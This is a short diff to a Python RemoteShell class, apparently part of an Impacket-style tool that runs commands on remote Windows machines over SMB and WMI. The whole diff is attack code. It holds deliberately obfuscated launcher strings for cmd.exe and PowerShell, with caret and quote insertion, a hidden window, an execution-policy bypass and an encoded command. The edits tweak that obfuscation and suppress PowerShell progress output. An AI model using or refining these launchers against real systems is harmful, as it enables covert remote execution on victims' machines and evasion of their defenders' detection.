@@ -128,7 +128,7 @@ class RemoteShell(cmd.Cmd):
         self.__outputBuffer = str('')
         self.__shell = 'c^m^d.exe ;"/"Q "@" ,/^c'
         self.__shell_type = shell_type
-        self.__pwsh = 'powershell.exe /n"op" –nolog —s"ta" —n"o"nint"e"r -w hi"d" -"e"xe"c"u"ti" b"y"pas"s" –e"n"c"od"ed"c" '
+        self.__pwsh = 'powershell.exe /n"op" –nolog -s"ta" /n"o"nint"e"r -w hi"d" -"e"xe"c"u"ti" b"y"pas"s" –e"n"c"od"ed"c" '
         self.__win32Process = win32Process
         self.__transferClient = smbConnection
         self.__silentCommand = silentCommand
@@ -285,7 +285,7 @@ class RemoteShell(cmd.Cmd):
 
     def execute_remote(self, data, shell_type='cmd'):
         if shell_type == 'powershell':
-            data = '$ProgressPreference="Continue";' + data
+            data = '$ProgressPreference="Ignore";' + data
             data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
 
         command = self.__shell + data
